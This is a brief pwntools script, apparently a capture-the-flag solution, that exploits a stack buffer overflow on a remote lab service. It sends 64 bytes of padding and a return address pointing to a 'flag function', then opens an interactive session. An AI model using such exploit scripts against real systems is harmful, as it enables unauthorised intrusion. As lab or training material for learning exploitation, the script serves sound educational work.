from pwn import *

# Connect to the remote service
io = remote('hlabs.helb-prigogine.be', 4337)  # Replace with actual server and port

# Craft payload
padding = b"A" * 64  # Buffer overflow
ret_addr = p64(0x004011b6)  # Address of flag function
payload = padding + ret_addr

# Send payload
io.sendline(payload)

# Get the flag
io.interactive()
